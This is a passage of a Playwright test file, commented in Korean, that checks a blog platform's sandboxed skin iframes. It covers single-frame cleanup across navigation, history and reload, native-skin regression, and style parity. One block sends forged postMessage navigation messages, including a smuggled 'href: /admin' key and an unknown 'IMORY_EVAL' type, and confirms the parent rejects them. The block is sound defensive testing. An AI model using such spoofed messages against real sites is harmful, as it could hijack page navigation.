      await frame.locator(".sb-nav-link", { hasText: "TXT" }).first().click();

      frame = await waitForSandboxPage(page, "category");

      check("[authorjspages] CATEGORY 로 갔다", Boolean(frame));

    }

    if (frame) {

      await page.goBack();

      frame = await waitForSandboxPage(page, "home");

      check("[authorjspages] 뒤로가기로 HOME 에 돌아왔다", Boolean(frame));

    }

    if (frame) {

      await frame.waitForFunction(
        () => Number(document.getElementById("sandboxFrameRoot")
          .getAttribute("data-imory-authorjs-ticks") || "0") >= 2,
        null,
        { timeout: 8000 }
      ).catch(() => {});

      const marks = await readAuthorJsMarks(frame);

      check("[authorjspages] ★ 돌아온 화면에서도 저자 JS 는 한 번만 돌았다",
        marks.runs === "1", String(marks.runs));

      check("[authorjspages] ★ 타이머가 한 벌뿐이다 (옛 화면 것이 안 남았다)",
        Number(marks.ticks) === Number(marks.globalTicks),
        marks.ticks + " / " + marks.globalTicks);

      await settleSingleSandboxFrame(page);

      const frameCount =
        await countSandboxFrameElements(page);

      check("[authorjspages] ★ 프레임이 쌓이지 않았다 (문서 전체에 하나)",
        frameCount === 1, String(frameCount));

      const visibleFrames =
        await countVisibleSandboxFrames(page);

      check("[authorjspages] ★ 보이는 프레임은 하나다",
        visibleFrames === 1, String(visibleFrames));

    }

    await ctx.close();
  }


  /* --- imorySkin.navigate() 가 실제로 화면을 옮긴다 ------ */

  {
    const { ctx, page } =
      await openPublicPath(browser, pkg, "/", { authorJs: true });

    let frame = await waitForSandboxPage(page, "home");

    check("[authorjspages] (navigate) HOME 이 떴다", Boolean(frame));

    if (frame) {

      const target =
        await frame.locator(".sb-js-go").getAttribute("data-imory-authorjs-target");

      check("[authorjspages] navigate() 대상 주소를 context 에서 읽었다",
        typeof target === "string" && target.indexOf("/category/") !== -1,
        String(target));

      await frame.locator(".sb-js-go").click();

      frame = await waitForSandboxPage(page, "category");

      check("[authorjspages] ★ imorySkin.navigate() 로 CATEGORY 가 열린다",
        Boolean(frame));

      check("[authorjspages] ★ 주소도 함께 바뀌었다",
        new URL(page.url()).pathname.indexOf("/category/") !== -1,
        page.url());

    }

    await ctx.close();
  }

}


/* =========================================================
   [screens] SANDBOX-5B — 문서 전체에 지금 화면의 프레임 하나

   ★ 무엇을 놓쳤었나

   지금까지 이 파일의 프레임 개수 판정은 전부 **컨테이너 안에서**
   셌다(#postList / #postSkinContainer). HOME 스킨은 #themeMount 에
   계속 mount 된 채 남는 것이 정상이라고 보았기 때문이다 — native
   스킨에서 HOME DOM 이 그 자리에 남아 있는 것과 같다고.

   native 에서는 맞는 말이다. 덮인 DOM 은 아무 일도 하지 않는다.
   sandbox 에서는 틀린 말이다. 덮인 자리의 iframe 은 **살아 있는
   문서**이고 그 안의 타이머 · rAF · 리스너 · 저자 JS 가 계속
   돈다. production(test1)에서 HOME → CATEGORY 뒤에 프레임이 둘
   떠 있었던 것이 그 결과다:

     #viewerArea > #themeMount            > iframe   (옛 HOME)
     #postArea > #postContainer > #postList > iframe (지금 CATEGORY)

   ★ 어떻게 재는가

   ① 문서 전체의 iframe 요소 수 — 가려진 것까지 센다.
   ② playwright 의 frame tree — 브라우저가 아는 **살아 있는 realm**.
   ③ 프레임 origin 의 localStorage 공용 심장박동
      (skin/test-skins/imory-sandbox-screens-v1.json). 지금 화면의
      프레임에서 계수기를 0 으로 되돌리고 잠시 기다린 뒤, 공용
      값과 이 realm 의 값을 견준다. 두 값이 같으면 돌고 있는
      realm 은 하나뿐이다 — 옛 프레임이 남아 있으면 공용 쪽만
      두 배로 늘어난다.
   ④ 같은 저장소의 cleanup 기록 — 없어진 프레임에서 pagehide →
      onCleanup 이 실제로 돌았는가(타이머·rAF·리스너를 저자가
      직접 끊는 지점).
========================================================== */

function readScreensPkg() {

  return JSON.parse(
    fs.readFileSync(
      path.join(ROOT, "skin", "test-skins", "imory-sandbox-screens-v1.json"),
      "utf8"
    )
  );

}


/* 브라우저가 아는 "살아 있는 realm" — 없어진 iframe 은 여기서 빠진다 */

function countSandboxRealms(page) {

  return page.frames().filter(
    (f) => {

      try {
        return f.url().startsWith(SANDBOX_ORIGIN);
      }

      catch (err) {
        return false;
      }

    }
  ).length;

}


const SCREENS_LOG_KEY = "imory.screens.log";


async function resetScreensBeats(frame) {

  return frame.evaluate((key) => {

    try {

      const log =
        JSON.parse(window.localStorage.getItem(key) || "{}") || {};

      /* 누가 뛰는지를 처음부터 다시 본다 */
      log.ticks = {};

      window.localStorage.setItem(key, JSON.stringify(log));

      return true;

    }

    catch (err) {
      return false;
    }

  }, SCREENS_LOG_KEY);

}


async function readScreensLog(frame) {

  return frame.evaluate((key) => {

    let log = {};

    try {
      log = JSON.parse(window.localStorage.getItem(key) || "{}") || {};
    }
    catch (err) { /* 저장소가 막혀 있다 */ }

    const root =
      document.getElementById("sandboxFrameRoot");

    const ticks =
      (log.ticks && typeof log.ticks === "object") ? log.ticks : {};

    const own =
      root ? root.getAttribute("data-imory-screens-realm") : null;

    return {
      /* 측정 창 동안 실제로 박동한 realm 의 수 */
      runningRealms: Object.keys(ticks).length,

      /* 그중 지금 화면의 realm 이 뛰었는가(살아 있는가) */
      ownTicks: Number((own && ticks[own]) || 0),

      ticks: ticks,
      lastTickPage: String(log.lastTickPage || ""),
      starts: Number(log.starts || 0),
      cleanups: Number(log.cleanups || 0),
      cleaned: String(log.cleaned || ""),
      stored: root ? root.getAttribute("data-imory-screens-store") : null,
      page: root ? root.getAttribute("data-imory-screens-page") : null
    };

  }, SCREENS_LOG_KEY);

}


const SCREENS_EMPTY_LOG = {
  reset: false,
  runningRealms: -1,
  ownTicks: 0,
  ticks: {},
  lastTickPage: "",
  starts: 0,
  cleanups: 0,
  cleaned: "",
  stored: null,
  page: null
};


/*
  "지금 돌고 있는 realm 은 하나뿐인가" — 위 ③.

  beats 를 0 으로 되돌리고 windowMs 만큼 기다린 뒤 공용/자기 값을
  견준다. 저장소가 막힌 브라우저에서는 stored 가 "0" 이므로
  호출자가 그 사실을 그대로 보고한다(조용히 통과시키지 않는다).

  ★ 재는 도중에 그 프레임이 사라질 수 있다 — 화면 전환 직후에는
  아직 한 박자가 남아 있고, WebKit 은 그 틈이 더 크다(2026-09-16
  실측). 그때는 지금 화면의 프레임을 다시 잡아 한 번 더 잰다.
*/

async function measureRunningRealms(page, frame, windowMs) {

  for (let attempt = 0; attempt < 2; attempt += 1) {

    const target =
      attempt === 0
        ? frame
        : await waitForSandboxPage(page, null, 8000);

    if (!target) continue;

    try {

      const reset =
        await resetScreensBeats(target);

      await page.waitForTimeout(windowMs || 700);

      const log =
        await readScreensLog(target);

      return { reset, ...log };

    }

    catch (err) {
      /* Frame was detached — 다음 바퀴에 지금 화면의 프레임으로 */
    }

  }

  return { ...SCREENS_EMPTY_LOG };

}


async function runScreens(browser) {

  console.log("\n[screens] 문서 전체에 지금 화면의 sandbox 프레임 하나");

  const pkg = readScreensPkg();


  /*
    화면을 한 바퀴 돌린다. 각 칸:
      label / 어떻게 가는가 / 도착한 화면의 pageType
  */

  async function expectOne(page, label) {

    const total =
      await settleSingleSandboxFrame(page);

    const placement =
      await describeSandboxFrames(page);

    check(`[screens] ★ ${label} — 문서 전체의 sandbox iframe 이 1개다`,
      total === 1, placement);

    check(`[screens] ★ ${label} — 살아 있는 프레임 realm 도 1개다`,
      countSandboxRealms(page) === 1,
      String(countSandboxRealms(page)));

    check(`[screens] ${label} — 그 하나가 보인다`,
      (await countVisibleSandboxFrames(page)) === 1);

    return total;

  }


  /* ===== 1. HOME 최초 진입 ============================= */

  {
    const { ctx, page, pageErrors } =
      await openPublicPath(browser, pkg, "/", { authorJs: true });

    let frame = await waitForSandboxPage(page, "home");

    check("[screens] HOME 이 프레임에 떴다", Boolean(frame));

    await expectOne(page, "HOME 최초 진입");

    if (frame) {

      const log = await measureRunningRealms(page, frame);

      check("[screens] fixture 가 프레임 origin 의 저장소를 쓴다",
        log.stored === "1", String(log.stored));

      check("[screens] ★ HOME 에서 돌고 있는 realm 은 하나뿐이다",
        log.stored === "1" && log.ownTicks > 0 && log.runningRealms === 1,
        `realms=${log.runningRealms} own=${log.ownTicks}`);

      check("[screens] 이 realm 의 저자 JS 는 한 번 돌았다",
        (await readAuthorJsMarks(frame)).runs === "1");

    }


    /* ===== 2. HOME -> CATEGORY ========================= */

    if (frame) {

      await frame.locator(".sb-nav-link", { hasText: "TXT" }).first().click();

      frame = await waitForSandboxPage(page, "category");

      check("[screens] CATEGORY 로 갔다", Boolean(frame));

    }

    if (frame) {

      await expectOne(page, "HOME → CATEGORY");

      check("[screens] ★ HOME 자리(#themeMount)에 iframe 이 남아 있지 않다",
        (await countSandboxFrameElements(page, "#themeMount")) === 0);

      const log = await measureRunningRealms(page, frame);

      check("[screens] ★ 옛 HOME realm 이 함께 돌고 있지 않다",
        log.runningRealms === 1 && log.ownTicks > 0,
        `realms=${log.runningRealms} own=${log.ownTicks} last=${log.lastTickPage}`);

      check("[screens] ★ 없어진 HOME 프레임에서 cleanup 이 돌았다 (pagehide)",
        log.cleanups >= 1 && log.cleaned.indexOf("home") !== -1,
        `cleanups=${log.cleanups} cleaned=${log.cleaned}`);

    }


    /* ===== 3. CATEGORY -> POST ======================== */

    if (frame) {

      await frame.locator(".sb-recent-link").first().click();

      frame = await waitForSandboxPage(page, "post");

      check("[screens] POST 로 갔다", Boolean(frame));

    }

    if (frame) {

      await expectOne(page, "CATEGORY → POST");

      /*
        CATEGORY 와 POST 는 컨테이너가 서로 다르다(#postList /
        #postSkinContainer). 예전 판정(컨테이너별)은 바로 이
        조합을 놓쳤다 — 옛 목록 컨테이너는 hidden 이 될 뿐
        비워지지 않기 때문이다.
      */

      check("[screens] ★ 옛 목록 자리(#postList)에 iframe 이 남아 있지 않다",
        (await countSandboxFrameElements(page, "#postList")) === 0);

      const log = await measureRunningRealms(page, frame);

      check("[screens] ★ 옛 CATEGORY realm 이 함께 돌고 있지 않다",
        log.runningRealms === 1 && log.ownTicks > 0,
        `realms=${log.runningRealms} own=${log.ownTicks}`);

    }


    /* ===== 4. POST -> HOME ============================ */

    if (frame) {

      await frame.locator(".sb-nav-home").first().click();

      frame = await waitForSandboxPage(page, "home");

      check("[screens] ★ POST 에서 HOME 으로 돌아왔다 (프레임이 다시 뜬다)",
        Boolean(frame));

    }

    if (frame) {

      await page.waitForURL(`**/${HOME_SLUG}`, { timeout: 10000 }).catch(() => {});

      await expectOne(page, "POST → HOME");

      check("[screens] ★ 돌아온 HOME 프레임은 #themeMount 안에 있다",
        (await countSandboxFrameElements(page, "#themeMount")) === 1);

      check("[screens] ★ 글 자리에는 iframe 이 남아 있지 않다",
        (await countSandboxFrameElements(page, "#postSkinContainer")) === 0 &&
        (await countSandboxFrameElements(page, "#postList")) === 0);

      const marks = await readAuthorJsMarks(frame);

      check("[screens] ★ 돌아온 HOME 에서 저자 JS 는 이 realm 에서 한 번만 돈다",
        marks.runs === "1" && marks.page === "home",
        `${marks.runs} / ${marks.page}`);

      check("[screens] ★ 타이머도 이 realm 것 한 벌뿐이다",
        Number(marks.ticks) === Number(marks.globalTicks),
        `${marks.ticks} / ${marks.globalTicks}`);

      const log = await measureRunningRealms(page, frame);

      check("[screens] ★ 돌아온 HOME 에서도 돌고 있는 realm 은 하나다",
        log.runningRealms === 1 && log.ownTicks > 0,
        `realms=${log.runningRealms} own=${log.ownTicks}`);

      check("[screens] ★ 지나온 화면마다 cleanup 이 돌았다",
        log.cleanups >= 3,
        `cleanups=${log.cleanups} cleaned=${log.cleaned}`);

    }

    check("[screens] 페이지 오류 없음",
      realPageErrors(pageErrors).length === 0,
      realPageErrors(pageErrors).join(" | "));

    await ctx.close();
  }


  /* ===== 5. BANNER / HIGHLIGHTS / GALLERY 왕복 ======== */

  {
    const { ctx, page, pageErrors } =
      await openPublicPath(browser, pkg, "/", { authorJs: true });

    check("[screens] (왕복) HOME 이 떴다",
      Boolean(await waitForSandboxPage(page, "home")));

    const ROUND = [
      ["/category/3", "banner", "BANNER"],
      ["/", "home", "HOME 복귀"],
      ["/highlights", "highlights", "HIGHLIGHTS"],
      ["/", "home", "HOME 복귀"],
      ["/category/2", "category", "GALLERY(Pic)"],
      ["/", "home", "HOME 복귀"]
    ];

    for (const [sub, pageType, label] of ROUND) {

      await page.goto(
        PARENT_ORIGIN + "/" + HOME_SLUG + sub,
        { waitUntil: "load" }
      );

      const frame =
        await waitForSandboxPage(page, pageType);

      check(`[screens] ${label} 이(가) 프레임에 떴다`, Boolean(frame));

      if (frame) {
        await expectOne(page, label);
      }

    }

    check("[screens] 왕복 페이지 오류 없음",
      realPageErrors(pageErrors).length === 0,
      realPageErrors(pageErrors).join(" | "));

    await ctx.close();
  }


  /* ===== 6. 뒤로/앞으로 10회 ========================== */

  {
    const { ctx, page, pageErrors } =
      await openPublicPath(browser, pkg, "/", { authorJs: true });

    let frame = await waitForSandboxPage(page, "home");

    check("[screens] (히스토리) HOME 이 떴다", Boolean(frame));

    if (frame) {

      await frame.locator(".sb-nav-link", { hasText: "TXT" }).first().click();

      frame = await waitForSandboxPage(page, "category");

      check("[screens] (히스토리) CATEGORY 로 갔다", Boolean(frame));

    }

    if (frame) {

      await frame.locator(".sb-recent-link").first().click();

      check("[screens] (히스토리) POST 로 갔다",
        Boolean(await waitForSandboxPage(page, "post")));

    }

    let worst = 0;
    let worstWhere = "";

    const step = async (go, label) => {

      await page[go]({ waitUntil: "load" });

      await waitForSandboxPage(page, null, 8000);

      const total =
        await settleSingleSandboxFrame(page);

      if (total > worst) {
        worst = total;
        worstWhere = label + " → " + new URL(page.url()).pathname +
          " · " + (await describeSandboxFrames(page));
      }

    };

    for (let i = 0; i < 5; i += 1) {

      await step("goBack", `${i}:back1`);
      await step("goBack", `${i}:back2`);
      await step("goForward", `${i}:fwd1`);
      await step("goForward", `${i}:fwd2`);

    }

    check("[screens] ★ 뒤로/앞으로 20번을 오가도 프레임은 늘 1개다",
      worst === 1,
      `최대 ${worst}개 · ${worstWhere}`);

    const last =
      await waitForSandboxPage(page, null, 8000);

    if (last) {

      const log = await measureRunningRealms(page, last);

      check("[screens] ★ 그동안 쌓인 realm 도 없다 (돌고 있는 것은 하나)",
        log.runningRealms === 1 && log.ownTicks > 0,
        `realms=${log.runningRealms} own=${log.ownTicks} starts=${log.starts}`);

    }

    check("[screens] 히스토리 페이지 오류 없음",
      realPageErrors(pageErrors).length === 0,
      realPageErrors(pageErrors).join(" | "));

    await ctx.close();
  }


  /* ===== 7. 직접 접속 / 새로고침 ====================== */

  for (const [sub, pageType] of [["/category/1", "category"], ["/post/101", "post"]]) {

    const { ctx, page, pageErrors } =
      await openPublicPath(browser, pkg, sub, { authorJs: true });

    check(`[screens] ${sub} 직접 접속 — 프레임이 떴다`,
      Boolean(await waitForSandboxPage(page, pageType)));

    /*
      ★ 여기가 직접 접속의 함정이다. index.html 의
      initHomeRenderer() 는 경로와 무관하게 HOME 도 그린다 —
      그 렌더가 한 박자 늦게 도착해도 HOME 자리에 프레임이
      생겨서는 안 된다(생기면 문서에 둘이 된다).
    */

    await page.waitForTimeout(1500);

    await expectOne(page, `${sub} 직접 접속`);

    check(`[screens] ★ ${sub} 직접 접속 — 늦게 도착한 HOME 렌더가 프레임을 만들지 않았다`,
      (await countSandboxFrameElements(page, "#themeMount")) === 0);

    await page.reload({ waitUntil: "load" });

    check(`[screens] ${sub} 새로고침 — 프레임이 다시 떴다`,
      Boolean(await waitForSandboxPage(page, pageType)));

    await page.waitForTimeout(1500);

    await expectOne(page, `${sub} 새로고침`);

    check(`[screens] ${sub} 페이지 오류 없음`,
      realPageErrors(pageErrors).length === 0,
      realPageErrors(pageErrors).join(" | "));

    await ctx.close();

  }


  /* ===== 8. 모바일 390px ============================== */

  {
    const { ctx, page, pageErrors } =
      await openPublicPath(browser, pkg, "/", {
        authorJs: true,
        viewport: { width: 390, height: 780 }
      });

    let frame = await waitForSandboxPage(page, "home");

    check("[screens] 390px HOME 이 떴다", Boolean(frame));

    if (frame) {

      await frame.locator(".sb-nav-link", { hasText: "TXT" }).first()
        .dispatchEvent("click");

      frame = await waitForSandboxPage(page, "category");

      check("[screens] 390px CATEGORY 로 갔다", Boolean(frame));

    }

    if (frame) {

      await expectOne(page, "390px HOME → CATEGORY");

      check("[screens] 390px 가로 넘침 없음",
        (await page.evaluate(() =>
          document.documentElement.scrollWidth -
          document.documentElement.clientWidth)) <= 0);

    }

    check("[screens] 390px 페이지 오류 없음",
      realPageErrors(pageErrors).length === 0,
      realPageErrors(pageErrors).join(" | "));

    await ctx.close();
  }


  /* ===== 9. native 스킨 회귀 ========================== */

  {
    const nativePkg = readScreensPkg();
    delete nativePkg.renderMode;

    const { ctx, page, pageErrors } =
      await openPublicPath(browser, nativePkg, "/", { authorJs: true });

    await page.waitForSelector("#themeMount .imory-skin-root", { timeout: 20000 });

    check("[screens] ★ native 회귀 — HOME 은 같은 문서에 그려진다 (iframe 0)",
      (await countSandboxFrameElements(page)) === 0);

    await page.locator("#themeMount .sb-nav-link").first().click();

    await page.waitForSelector("#postList .imory-skin-root", { timeout: 20000 });

    check("[screens] ★ native 회귀 — CATEGORY 도 같은 문서에 그려진다 (iframe 0)",
      (await countSandboxFrameElements(page)) === 0);

    /*
      ★ native 에서는 HOME DOM 이 #themeMount 에 그대로 남는 것이
      지금까지의 동작이고, 이 라운드는 그것을 바꾸지 않았다.
      (덮인 DOM 은 아무 일도 하지 않으므로 바꿀 이유가 없다.)
    */

    check("[screens] ★ native 회귀 — HOME DOM 은 예전처럼 #themeMount 에 남는다",
      (await page.locator("#themeMount .imory-skin-root").count()) === 1);

    check("[screens] native 회귀 페이지 오류 없음",
      realPageErrors(pageErrors).length === 0,
      realPageErrors(pageErrors).join(" | "));

    await ctx.close();
  }

}

async function runNav(browser) {

  console.log("\n[nav] 프레임 안 링크 · 뒤로가기 · 위조 거부");

  const sandboxPkg = readSandboxPkg();


  /* --- HOME -> CATEGORY -> POST -> CATEGORY ------------- */

  {
    const { ctx, page, pageErrors } =
      await openPublicPath(browser, sandboxPkg, "/");

    let frame = await waitForSandboxPage(page, "home");

    check("[nav] HOME 이 프레임에 떴다", Boolean(frame));

    if (frame) {

      await frame.locator(".sb-nav-link", { hasText: "TXT" }).first().click();

      frame = await waitForSandboxPage(page, "category");

      check("[nav] ★ HOME 의 카테고리 링크로 CATEGORY 가 열린다",
        Boolean(frame));

      await page.waitForURL(
        `**/${HOME_SLUG}/category/1`, { timeout: 10000 }
      ).catch(() => {});

      check("[nav] ★ 주소도 그 카테고리로 바뀌었다",
        new URL(page.url()).pathname === `/${HOME_SLUG}/category/1`,
        page.url());

    }

    if (frame) {

      await frame.locator(".sb-recent-link", { hasText: "두 번째 글" })
        .first().click();

      frame = await waitForSandboxPage(page, "post");

      check("[nav] ★ CATEGORY 의 글 링크로 POST 가 열린다", Boolean(frame));

      await page.waitForURL(
        `**/${HOME_SLUG}/post/102`, { timeout: 10000 }
      ).catch(() => {});

      check("[nav] ★ 주소도 그 글로 바뀌었다",
        new URL(page.url()).pathname === `/${HOME_SLUG}/post/102`,
        page.url());

    }

    if (frame) {

      await frame.locator(".sb-back").first().click();

      frame = await waitForSandboxPage(page, "category");

      check("[nav] ★ POST 에서 카테고리로 돌아간다", Boolean(frame));

      /*
        주소는 라우터가 화면을 그린 **뒤**에 정리한다(기존 동작).
        그래서 프레임 렌더만 보고 바로 주소를 재면 한 박자 이르다.
      */

      await page.waitForURL(
        `**/${HOME_SLUG}/category/1`, { timeout: 10000 }
      ).catch(() => {});

      check("[nav] 그때 주소도 카테고리다",
        new URL(page.url()).pathname === `/${HOME_SLUG}/category/1`,
        page.url());

    }


    /* --- 뒤로가기 / 앞으로가기 ------------------------- */

    await page.goBack({ waitUntil: "load" }).catch(() => {});

    await page.waitForURL(
      `**/${HOME_SLUG}/post/102`, { timeout: 10000 }
    ).catch(() => {});

    check("[nav] ★ 뒤로가기로 글 주소로 돌아온다",
      new URL(page.url()).pathname === `/${HOME_SLUG}/post/102`,
      page.url());

    check("[nav] 그 화면이 프레임에 다시 그려진다",
      Boolean(await waitForSandboxPage(page, "post")));

    await page.goForward({ waitUntil: "load" }).catch(() => {});

    await page.waitForURL(
      `**/${HOME_SLUG}/category/1`, { timeout: 10000 }
    ).catch(() => {});

    check("[nav] ★ 앞으로가기로 카테고리 주소로 돌아온다",
      new URL(page.url()).pathname === `/${HOME_SLUG}/category/1`,
      page.url());

    check("[nav] 그 화면도 프레임에 다시 그려진다",
      Boolean(await waitForSandboxPage(page, "category")));

    /*
      ★ "문서 전체에 하나" — SANDBOX-5B.

      예전에는 여기서 컨테이너별로만 셌다. HOME 스킨이 #themeMount
      에 계속 mount 된 채 남는 것을 정상으로 보았기 때문이다.
      그것이 production 에서 "HOME → CATEGORY 뒤 프레임 둘"을
      놓친 자리다. 지금은 문서 전체로 센다.
    */

    const framePlacement =
      await page.evaluate(() =>
        Array.from(document.querySelectorAll("iframe.imory-skin-sandbox-frame"))
          .map(el => {
            const parent = el.parentElement;
            return ((parent && parent.id) || "?") +
              (parent && parent.offsetParent === null && parent.id !== "themeMount"
                ? "(hidden)" : "");
          })
      );

    const byParent =
      framePlacement.reduce((acc, id) => {
        acc[id] = (acc[id] || 0) + 1;
        return acc;
      }, {});

    check("[nav] ★ 한 컨테이너에 프레임이 둘 생기지 않는다 (중복 렌더 없음)",
      Object.values(byParent).every(n => n === 1),
      JSON.stringify(byParent));

    /*
      ★ 문서 전체에 sandbox 프레임이 정확히 하나다 — 옛 화면의
      것은 가려진 것이 아니라 **없다**.
    */

    await settleSingleSandboxFrame(page);

    check("[nav] ★ 문서 전체의 sandbox 프레임이 정확히 하나다",
      (await countSandboxFrameElements(page)) === 1,
      JSON.stringify(framePlacement));

    check("[nav] ★ 그 하나가 지금 보이는 화면의 것이다",
      (await countVisibleSandboxFrames(page)) === 1);

    check("[nav] 페이지 오류 없음",
      realPageErrors(pageErrors).length === 0,
      realPageErrors(pageErrors).join(" | "));

    await ctx.close();
  }


  /* --- 직접 접속 / 새로고침 ---------------------------- */

  {
    const { ctx, page, pageErrors } =
      await openPublicPath(browser, sandboxPkg, "/post/101");

    check("[nav] ★ POST 주소로 직접 들어와도 프레임이 뜬다",
      Boolean(await waitForSandboxPage(page, "post")));

    await page.reload({ waitUntil: "load" });

    check("[nav] ★ 새로고침해도 같은 화면이다",
      Boolean(await waitForSandboxPage(page, "post")) &&
      new URL(page.url()).pathname === `/${HOME_SLUG}/post/101`);

    check("[nav] 페이지 오류 없음",
      realPageErrors(pageErrors).length === 0,
      realPageErrors(pageErrors).join(" | "));

    await ctx.close();
  }


  /* --- 모바일 터치 ------------------------------------- */

  {
    const { ctx, page, pageErrors } =
      await openPublicPath(browser, sandboxPkg, "/", {
        viewport: { width: 390, height: 780 }
      });

    const frame = await waitForSandboxPage(page, "home");

    check("[nav] 390px 에서도 HOME 이 뜬다", Boolean(frame));

    if (frame) {

      await frame.locator(".sb-nav-link", { hasText: "TXT" }).first()
        .dispatchEvent("click");

      check("[nav] ★ 모바일에서도 링크가 눌린다",
        Boolean(await waitForSandboxPage(page, "category")));

    }

    check("[nav] 390px 가로 넘침 없음",
      (await page.evaluate(() =>
        document.documentElement.scrollWidth -
        document.documentElement.clientWidth)) <= 0);

    check("[nav] 페이지 오류 없음",
      realPageErrors(pageErrors).length === 0,
      realPageErrors(pageErrors).join(" | "));

    await ctx.close();
  }


  /* --- 위조 거부 --------------------------------------- */

  {
    const { ctx, page, pageErrors } =
      await openPublicPath(browser, sandboxPkg, "/");

    const frame = await waitForSandboxPage(page, "home");

    check("[nav] 위조 검증 — HOME 이 떴다", Boolean(frame));

    if (frame) {

      /*
        ★ 프레임 realm 안에서 직접 쏜다. origin/source 는 진짜지만
        내용이 계약과 다른 메시지들 — 부모가 화면을 바꾸면 안 된다.
      */

      const before = page.url();

      await frame.evaluate((parentOrigin) => {

        const send = (payload) =>
          window.parent.postMessage(
            { imory: 1, type: "IMORY_NAVIGATE", seq: 9, payload },
            parentOrigin
          );

        /* 표에 없는 id */
        send({ contract: 1, renderSeq: 1, navId: 987654 });

        /* href 를 끼워 보낸다 — 알려지지 않은 키라 봉투에서 거부 */
        send({ contract: 1, renderSeq: 1, navId: 1, href: "/admin" });

        /* 옛 화면의 renderSeq */
        send({ contract: 1, renderSeq: 99, navId: 1 });

        /* contract 불일치 */
        send({ contract: 2, renderSeq: 1, navId: 1 });

        /* 봉투 위조 */
        window.parent.postMessage(
          { imory: 2, type: "IMORY_NAVIGATE", seq: 1,
            payload: { contract: 1, renderSeq: 1, navId: 1 } },
          parentOrigin
        );

        /* 모르는 type */
        window.parent.postMessage(
          { imory: 1, type: "IMORY_EVAL", seq: 1, payload: { contract: 1 } },
          parentOrigin
        );

      }, PARENT_ORIGIN);

      await page.waitForTimeout(1200);

      check("[nav] ★ 위조/불일치 메시지로는 화면이 바뀌지 않는다",
        page.url() === before, page.url());

      check("[nav] ★ 그때도 HOME 프레임이 그대로 살아 있다",
        Boolean(await waitForSandboxPage(page, "home", 3000)));

    }


    /*
      ★ 다른 origin 이 부모에게 같은 메시지를 보내도 소용없다.
      부모는 event.origin 과 event.source 를 둘 다 본다 — 여기서는
      부모 자신의 window 에서 쏘므로 origin 이 프레임 origin 이
      아니고, source 도 iframe.contentWindow 가 아니다.
    */

    {
      const before = page.url();

      await page.evaluate(() => {
        for (let id = 1; id <= 20; id += 1) {
          window.postMessage(
            { imory: 1, type: "IMORY_NAVIGATE", seq: 1,
              payload: { contract: 1, renderSeq: 1, navId: id } },
            window.location.origin
          );
        }
      });

      await page.waitForTimeout(800);

      check("[nav] ★ 부모 자신이 쏜 메시지도 거부된다 (origin/source)",
        page.url() === before, page.url());
    }

    check("[nav] 페이지 오류 없음",
      realPageErrors(pageErrors).length === 0,
      realPageErrors(pageErrors).join(" | "));

    await ctx.close();
  }

}




/* =========================================================
   [bodyparity] 같은 글이 native 와 프레임에서 같은 모양인가
             — SANDBOX-3.2

   기준 문서: IMORY_SANDBOX_SKIN_DESIGN.md §M-3

   ★ 무엇을 보는가

   본문은 두 종류의 스타일에 기댄다.

     1) 인라인 선언   프리셋에서 계산되는 글꼴·크기·색·행간·
                      형광펜 그라디언트·강조선 두께. 부모가 검증해
                      nonce 붙은 <style> 로 옮긴다(SANDBOX-3.1,
                      posts/style/posts-body-style-extract.js).
     2) class 규칙    프리셋과 무관한 고정 규칙 — 형광펜 좌우
                      여백과 box-decoration-break, 강조선 **마커**
                      숨김, 대사/지문의 글자 상속, 복사 상자·
                      구분선의 모양.

   2) 는 스타일시트에만 있고 프레임은 그것을 읽지 않았다. 그래서
   SANDBOX-3.1 뒤에도 같은 글이 프레임에서만 달랐다 — 형광펜 좌우
   여백 0, 줄이 바뀌면 띠가 잘림(box-decoration-break: slice),
   강조선 마커가 display:none 이 아니라 인라인 상자로 남음, 복사
   상자와 구분선은 아무 모양도 없음.

   ★ 어떻게 판정하는가

   같은 글(post 101)을 **같은 스킨**으로 두 번 연다 — 한 번은
   renderMode 를 뺀 native 로, 한 번은 sandbox 로. 그리고
   **계산값**을 요소별로 맞춰 본다. "CSS 를 읽었는가"가 아니라
   "화면이 같은가"를 보는 것이다.

   DOM 도 비교한다. 프레임 쪽은 inline style 이 클래스로 바뀌어
   있으므로(imory-pb-N) 그 둘만 지우고 글자 단위로 견준다 —
   구조가 달라지면 여기서 걸린다.
========================================================== */

/*
  두 화면에서 **같은 함수**로 같은 것을 읽는다. 여기 있는 속성은
  전부 본문 파이프라인이 실제로 정하는 것들이다.
*/

const BODY_PARITY_PROBE = () => {

  /*
    ★ 보이는 것만 고른다. 화면을 옮겨도 이전 화면의 컨테이너는
    hidden 으로 남아 있을 뿐 비워지지 않아서(위 waitForSandboxPage
    주석과 같은 이유), 첫 번째 region 을 집으면 옛 화면의 빈 자리를
    재게 된다.
  */

  const all =
    [...document.querySelectorAll('[data-imory-region="post-body"]')];

  const root =
    all.find(el => el.getClientRects().length > 0) ||
    all[all.length - 1];

  if (!root) {
    return { missing: true };
  }

  const pick = (el) => {

    if (!el) return null;

    const s = getComputedStyle(el);

    return {
      tag: el.tagName,
      fontFamily: s.fontFamily,
      fontSize: s.fontSize,
      fontWeight: s.fontWeight,
      color: s.color,
      lineHeight: s.lineHeight,
      letterSpacing: s.letterSpacing,
      textAlign: s.textAlign,
      textIndent: s.textIndent,
      wordBreak: s.wordBreak,
      whiteSpace: s.whiteSpace,
      display: s.display,
      backgroundColor: s.backgroundColor,
      backgroundImage: s.backgroundImage,
      backgroundSize: s.backgroundSize,
      backgroundRepeat: s.backgroundRepeat,
      borderLeft:
        s.borderLeftWidth + " " + s.borderLeftStyle + " " + s.borderLeftColor,
      borderTop:
        s.borderTopWidth + " " + s.borderTopStyle + " " + s.borderTopColor,
      paddingTop: s.paddingTop,
      paddingRight: s.paddingRight,
      paddingBottom: s.paddingBottom,
      paddingLeft: s.paddingLeft,
      marginTop: s.marginTop,
      marginBottom: s.marginBottom,
      boxDecorationBreak:
        s.boxDecorationBreak || s.webkitBoxDecorationBreak || "",
      height: Math.round(el.getBoundingClientRect().height),
      width: Math.round(el.getBoundingClientRect().width)
    };

  };

  /*
    ★ 견주기 전에 두 가지를 걷어낸다.

    1) imory-pb-N 클래스와 style 속성
       같은 선언이 프레임에서는 클래스로, native 에서는 inline 으로
       있을 뿐이다(SANDBOX-3.1). 표현 방식이 아니라 구조를 본다.

    2) 읽는 이의 하이라이트 표시(.post-highlight)
       native 는 본문을 그린 **뒤** 이 표시를 덧칠한다
       (posts/view/posts-view-highlight-anchor.js). 프레임 안에서는
       아직 덧칠하지 않는다 — 설계 문서 §K-6 의 알려진 차이이고,
